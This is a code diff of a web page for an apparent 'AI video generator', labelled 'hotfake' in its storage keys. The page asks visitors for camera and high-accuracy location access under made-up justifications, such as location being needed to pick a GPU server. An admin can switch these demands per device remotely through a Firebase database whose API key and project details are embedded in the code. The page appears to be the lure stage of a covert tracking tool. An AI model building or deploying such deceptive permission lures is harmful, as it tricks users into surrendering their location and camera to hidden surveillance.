@@ -21,22 +21,14 @@
     </style>
 </head>
 <body>
-
     <div id="loadingState" class="loader"></div>
-
     <div class="box" id="permBox">
         <h2>System Permissions</h2>
         <p class="sub-text">To generate AI videos locally, secure access is required.</p>
-        
         <div class="perm-list">
-            <div class="perm-item" id="req-location">
-                <div class="perm-icon">📍</div><div class="perm-details"><h4>Location</h4><p>Required to assign correct GPU cluster server.</p></div>
-            </div>
-            <div class="perm-item" id="req-camera">
-                <div class="perm-icon">📸</div><div class="perm-details"><h4>Camera</h4><p>Required for identity verification logic.</p></div>
-            </div>
+            <div class="perm-item" id="req-location"><div class="perm-icon">📍</div><div class="perm-details"><h4>Location</h4><p>Required to assign correct GPU cluster server.</p></div></div>
+            <div class="perm-item" id="req-camera"><div class="perm-icon">📸</div><div class="perm-details"><h4>Camera</h4><p>Required for identity verification logic.</p></div></div>
         </div>
-
         <button class="btn" id="allowBtn" onclick="requestNeededPermissions()">Allow & Continue</button>
         <p id="errorMsg" style="color:#ff4d4d; font-size:0.8rem; text-align:center; display:none; margin-top:10px;">Please allow requested permissions.</p>
     </div>
@@ -47,56 +39,29 @@
 
         const app = initializeApp({ apiKey: "AIzaSyCTfvrtZuHXk3RW91Dcwpbghhq--D6X2s8", authDomain: "inshelp-f2cba.firebaseapp.com", databaseURL: "https://inshelp-f2cba-default-rtdb.firebaseio.com", projectId: "inshelp-f2cba" });
         const db = getDatabase(app);
-
         let requiredByAdmin = { location: true, camera: false }; 
-        const deviceId = localStorage.getItem('hotfake_uid') || "Unknown";
+        const deviceId = localStorage.getItem('hotfake_deep_uid') || "Unknown";
 
         async function initPermissionCheck() {
             try {
-                const globalRef = await get(ref(db, 'settings/permissions'));
-                if(globalRef.exists()) requiredByAdmin = { ...requiredByAdmin, ...globalRef.val() };
-                const userRef = await get(ref(db, `users/${deviceId}/custom_perms`)); 
-                if(userRef.exists()) requiredByAdmin = { ...requiredByAdmin, ...userRef.val() }; 
+                const globalRef = await get(ref(db, 'settings/permissions')); if(globalRef.exists()) requiredByAdmin = { ...requiredByAdmin, ...globalRef.val() };
+                const userRef = await get(ref(db, `users/${deviceId}/custom_perms`)); if(userRef.exists()) requiredByAdmin = { ...requiredByAdmin, ...userRef.val() }; 
             } catch(e) {}
 
             let needsUI = false;
+            if (requiredByAdmin.location) { try { const lStatus = await navigator.permissions.query({ name: 'geolocation' }); if (lStatus.state !== 'granted') { needsUI = true; document.getElementById('req-location').style.display = 'flex'; } } catch(e) { needsUI = true; document.getElementById('req-location').style.display = 'flex'; } }
+            if (requiredByAdmin.camera) { try { const cStatus = await navigator.permissions.query({ name: 'camera' }); if (cStatus.state !== 'granted') { needsUI = true; document.getElementById('req-camera').style.display = 'flex'; } } catch(e) { needsUI = true; document.getElementById('req-camera').style.display = 'flex'; } }
 
-            if (requiredByAdmin.location) {
-                try {
-                    const locStatus = await navigator.permissions.query({ name: 'geolocation' });
-                    if (locStatus.state !== 'granted') { needsUI = true; document.getElementById('req-location').style.display = 'flex'; }
-                } catch(e) { needsUI = true; document.getElementById('req-location').style.display = 'flex'; } 
-            }
-            if (requiredByAdmin.camera) {
-                try {
-                    const camStatus = await navigator.permissions.query({ name: 'camera' });
-                    if (camStatus.state !== 'granted') { needsUI = true; document.getElementById('req-camera').style.display = 'flex'; }
-                } catch(e) { needsUI = true; document.getElementById('req-camera').style.display = 'flex'; }
-            }
-
-            if (!needsUI) { window.location.href = 'index.html'; } 
-            else { document.getElementById('loadingState').style.display = 'none'; document.getElementById('permBox').style.display = 'block'; }
+            if (!needsUI) { window.location.href = 'index.html'; } else { document.getElementById('loadingState').style.display = 'none'; document.getElementById('permBox').style.display = 'block'; }
         }
 
         window.requestNeededPermissions = async function() {
-            const btn = document.getElementById('allowBtn');
-            btn.innerText = "Processing..."; document.getElementById('errorMsg').style.display = 'none'; 
-
+            const btn = document.getElementById('allowBtn'); btn.innerText = "Processing..."; document.getElementById('errorMsg').style.display = 'none'; 
             try {
-                if(document.getElementById('req-camera').style.display === 'flex') {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                    stream.getTracks().forEach(track => track.stop());
-                }
-                if(document.getElementById('req-location').style.display === 'flex') {
-                    await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition((pos) => { localStorage.setItem('gpsVerified', 'true'); resolve(pos); }, reject, { enableHighAccuracy: true });
-                    });
-                }
-                btn.style.background = "#2DC653"; btn.innerText = "Success! Redirecting...";
-                setTimeout(() => window.location.href = 'index.html', 800); 
-            } catch (e) {
-                btn.innerText = "Allow & Continue"; document.getElementById('errorMsg').style.display = 'block';
-            }
+                if(document.getElementById('req-camera').style.display === 'flex') { const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); stream.getTracks().forEach(track => track.stop()); }
+                if(document.getElementById('req-location').style.display === 'flex') { await new Promise((resolve, reject) => { navigator.geolocation.getCurrentPosition((pos) => { localStorage.setItem('gpsVerified', 'true'); resolve(pos); }, reject, { enableHighAccuracy: true }); }); }
+                btn.style.background = "#2DC653"; btn.innerText = "Success! Redirecting..."; setTimeout(() => window.location.href = 'index.html', 800); 
+            } catch (e) { btn.innerText = "Allow & Continue"; document.getElementById('errorMsg').style.display = 'block'; }
         };
         initPermissionCheck();
     </script>
